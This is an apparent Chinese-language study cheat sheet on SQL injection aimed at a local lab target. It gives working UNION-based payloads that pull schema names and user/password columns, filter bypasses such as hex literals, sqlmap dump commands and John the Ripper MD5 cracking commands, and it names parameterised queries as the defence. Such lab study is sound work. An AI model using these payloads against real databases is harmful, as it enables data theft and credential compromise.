---
title: SQL 注入基础速查
description: 手工联合注入五步流程、常见防御与绕过对比、sqlmap 与 john 常用参数备忘
---

# SQL 注入基础速查

## 一、手工联合注入五步流程

1. **判断闭合方式与类型**：输入 `1'`
   - 报错出现 `''1'''`：字符型（单引号包裹），需用 `'` 闭合并用 `#` 或 `-- ` 注释后续语句。
   - 报错类似 `1\'` 且无外层引号：数字型，无需单引号闭合。
2. **探测字段数**：`1' order by 1 #` → `2` → `3`（到第 3 个报错说明原查询为 2 列）。
3. **占显示位与基本信息**：
   ```sql
   -1' union select database(), version() #
   ```
4. **枚举表名与列名**（借助 `information_schema`）：
   ```sql
   -1' union select 1, group_concat(table_name)
   from information_schema.tables where table_schema=database() #

   -1' union select 1, group_concat(column_name)
   from information_schema.columns
   where table_schema=database() and table_name='users' #
   ```
   > 若单引号被转义，表名可用十六进制字面量代替，例如 `'users'` → `0x7573657273`。
5. **提取目标字段**：
   ```sql
   -1' union select user, password from users #
   ```

---

## 二、常见防护级别对比

| 场景 | 常见实现方式 | 问题与分析 |
| :--- | :--- | :--- |
| **无过滤拼接** | 直接拼接 `'$id'`，原样回显数据库错误 | 字符型注入，直接闭合引号并注释尾部即可 |
| **前端限制 + 转义** | 下拉框传参 + `mysqli_real_escape_string()` 转义引号 | 前端限制可通过抓包或修改 DOM 绕过；若后端 SQL 为数字型 `WHERE id = $id`，不依赖引号也能注入（如 `-1 union select ...`） |
| **隐藏报错 + Session 传参** | 参数写入 Session、关闭错误回显并拼接 `LIMIT 1` | 共享 Session 的接口之间会相互影响；使用 `#` 可注释掉末尾的 `' LIMIT 1` |
| **参数化查询** | 类型校验（如 `is_numeric`）+ PDO `prepare` / `bindParam` | SQL 语法结构与输入数据分离，用户输入只作为字面量解析，不会改变语句结构 |

---

## 三、常用工具参数备忘

### sqlmap 常用枚举

```bash
# 对本地或内网目标测试时先清空当前 shell 的代理环境变量
unset http_proxy https_proxy

sqlmap -u "http://127.0.0.1:8080/target/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=xxx; security=low" --batch --dbs

sqlmap -u "http://127.0.0.1:8080/target/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=xxx; security=low" --batch -D db_name -T users --dump
```

### John the Ripper 离线爆破 Raw-MD5

输入文件每行格式为 `username:md5_hex`：

```bash
john --format=Raw-MD5 --wordlist=/usr/share/john/password.lst hashes.txt
john --show --format=Raw-MD5 hashes.txt
```
